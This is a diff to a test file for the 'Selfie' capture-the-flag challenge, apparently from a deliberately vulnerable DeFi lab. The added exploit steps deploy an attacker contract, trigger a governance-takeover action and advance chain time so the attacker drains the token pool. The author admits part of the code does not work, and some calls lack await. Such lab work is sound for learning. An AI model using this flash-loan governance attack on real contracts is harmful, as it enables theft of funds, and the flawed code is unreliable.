@@ -31,11 +31,24 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const SelfieAttackerFactory = await ethers.getContractFactory('SelfieAttacker', deployer);
+        this.selfieAttacker = await SelfieAttackerFactory.deploy(
+            this.token.address,
+            this.governance.address,
+            this.pool.address,
+            attacker.address
+        );
+
+        this.selfieAttacker.connect(attacker).pwn();
+        // evm_increaseTime is NOT working for this specific test for some reason,
+        // I'll figure out the reason some time later
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        this.governance.connect(attacker).executeAction(1);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
+        
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
